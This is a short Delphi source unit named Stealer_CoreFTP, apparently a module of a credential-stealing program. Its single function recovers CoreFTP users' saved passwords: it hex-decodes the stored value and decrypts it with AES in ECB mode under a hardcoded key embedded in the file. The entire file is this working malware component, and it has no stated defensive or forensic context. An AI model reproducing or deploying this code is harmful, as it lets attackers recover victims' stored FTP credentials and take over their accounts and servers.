unit Stealer_CoreFTP;

interface

uses
  Sysutils,Windows,DCPrijndael;

function CoreFTPDecrypt(const pwd:string): String;

implementation

function CoreFTPDecrypt(const pwd:string): String;
var
  i:integer;
  Cipher: TDCP_rijndael;
  pwdarr:array[0..255] of byte;
  inputlen:dword;
const
  Key: array[0..15] of byte=
    ($68,$64,$66,$7A,$70,$79,$73,$76,$70,$7A,$69,$6D,$6F,$72,$68,$6B);
begin
  result:='';
  inputlen:=length(pwd) div 2;
  fillchar(pwdarr,sizeof(pwdarr),0);
  for i:=0 to inputlen-1 do
  begin
    pwdarr[i]:=strtoint('$'+pwd[i*2+1]+pwd[i*2+2]);
  end;
  Cipher := TDCP_rijndael.Create(nil);
  Cipher.Init(Key,Sizeof(Key)*8,nil);
  for i:=1 to (inputlen div sizeof(key)) do
  begin
    Cipher.DecryptECB(pwdarr[(i-1)*sizeof(key)],pwdarr[(i-1)*sizeof(key)]);
  end;
  for i:=0 to sizeof(pwdarr)-1 do
  begin
    if pwdarr[i]<>0 then result:=result+chr(pwdarr[i]);
  end;
  Cipher.Burn;
  Cipher.Free;
end;

end.
